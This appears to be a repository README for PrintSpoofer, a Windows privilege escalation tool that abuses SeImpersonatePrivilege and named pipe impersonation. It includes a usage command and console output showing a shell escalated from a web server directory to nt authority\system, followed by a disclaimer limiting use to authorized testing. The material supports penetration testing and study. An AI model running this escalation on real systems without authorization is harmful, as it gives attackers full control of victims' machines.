# printspoofer
PrintSpoofer is a Windows privilege escalation technique that abuses the Print Spooler service and Impersonation Tokens (particularly named pipe impersonation / SeImpersonatePrivilege) to escalate from a service or constrained user to SYSTEM on vulnerable Windows versions.

📌 Overview

PrintSpoofer leverages:

The Windows Print Spooler service (spoolsv.exe)
Impersonation privileges (especially SeImpersonatePrivilege)
Named pipe impersonation via RPC over ALPC
When successfully exploited, a low-privileged user with impersonation rights can spawn a SYSTEM-level shell.
This exploit affects certain Windows 10 / Server systems depending on patch level, especially those vulnerable before Microsoft addressed the issue.

```
C:\wamp\www>PrintSpoofer32.exe -i -c cmd.exe
PrintSpoofer32.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

⚠️ Disclaimer

This tool is intended ONLY for:

Security research
Educational learning
Authorized penetration testing in environments you own or have explicit permission to test
Misuse of this tool is illegal. The author is not responsible for any damage or misuse.
